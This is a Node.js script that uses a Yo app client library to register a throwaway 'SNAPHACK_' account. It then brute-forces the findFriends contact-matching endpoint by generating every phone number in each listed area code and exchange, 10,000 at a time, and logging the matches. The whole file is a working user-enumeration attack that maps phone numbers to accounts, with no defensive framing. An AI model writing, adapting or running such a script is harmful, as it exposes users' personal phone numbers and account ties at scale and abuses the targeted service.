var yoplait = require('yoplait');
var list = require('./exchanges.json');
var codes = require('./areacodes.json');
var format = require('string-format-js');
var sleep = require('sleep');
var fs = require("fs");
var util = require('util');
var udid = yoplait.genUdid()
  , username = 'SNAPHACK_' + Date.now();

console.log('signing up \'' + username + '\' with udid ' + udid)
yoplait.signUp(username, udid, udid, function(err, yo) {
  if (err) {
    return console.log('sign up failed!: ', err)
  }

console.log('%04d'.format(1));

for(var area in codes['areacodes']){
  for(var ex in list['exchange']){
    // console.log(codes['areacodes'][area]);
    // console.log(list['exchange'][ex]);
    var searchString = "";
    for(var i = 0; i < 10000; i++){
      searchString+='+1%s%s%04d,'.format(codes['areacodes'][area], list['exchange'][ex], i);
    }
    var foonumbers = {numbers:searchString, udid: udid};

      yo.findFriends(foonumbers, function(err, data){
          if(err){
            console.log(err);
          }else{
            console.log(data);
          }
      })
    }
  }
});